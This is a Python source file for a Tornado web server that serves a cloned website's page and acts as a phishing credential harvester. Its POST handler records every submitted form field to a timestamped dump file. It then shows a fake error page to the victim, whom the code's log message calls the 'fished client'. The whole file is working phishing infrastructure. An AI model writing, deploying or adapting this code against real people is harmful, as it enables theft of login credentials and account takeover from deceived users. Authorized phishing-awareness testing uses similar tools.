#!/usr/bin/env python
# -*- coding: utf-8 -*-

import datetime
import logging
import os
from tornado import web
from tools import ConfLoader, server, FileManager

(log_level, log_file) = ConfLoader.load_log_conf()  # load log conf
logging.basicConfig(format='%(asctime)s %(levelname)s:%(message)s', level=log_level, filename=log_file)  # init logger


class MainHandler(web.RequestHandler):
    """MainHandler handle root and unknown endpoints"""

    def get(self):
        # TODO doc
        with open(index_file, mode='r', encoding='UTF-8') as file:
            self.write(file.read())

    def post(self):
        # TODO doc
        arguments = {}
        try:
            for k in self.request.arguments:
                arguments[k] = self.get_argument(k)
        except web.HTTPError:   # no or wrong argument
            logging.warning('Argument error on MainHandler POST request')
        if len(arguments) > 0:
            dump = os.path.join(dump_path, str(datetime.datetime.now()))
            content = str(arguments) + '\n'
            FileManager.append_to_file(dump, content)
        else:
            logging.info('POST request without arguments')
        with open(error_file, mode='r', encoding='UTF-8') as page:
            logging.debug('Loading the fake error page for this fished client')
            self.write(page.read())  # then show an error page to the client


def main():
    """Main function, define an Application and start AdminServer instances with it."""
    application = web.Application([
        (r'/rsc/(.*)', web.StaticFileHandler, {'path': rsc_folder_path}),
        (r'/', MainHandler),
        (r'/.*', MainHandler)
    ])
    server.start_server(application)  # start AdminServer with this Application and previously loaded parameters


if __name__ == '__main__':
    (website_name, page_folder_path, rsc_folder_path, dump_folder_path) = ConfLoader.load_fish_conf()  # load main conf
    index_file = os.path.join(page_folder_path, website_name, 'index.html')  # determine index page file path
    error_file = os.path.join(page_folder_path, website_name, 'error.html')  # determine error page file path
    dump_path = os.path.join(dump_folder_path, website_name)  # determine website dump folder path
    main()  # execute main function
else:
    logging.critical('Not executed as an application !')
    raise RuntimeError
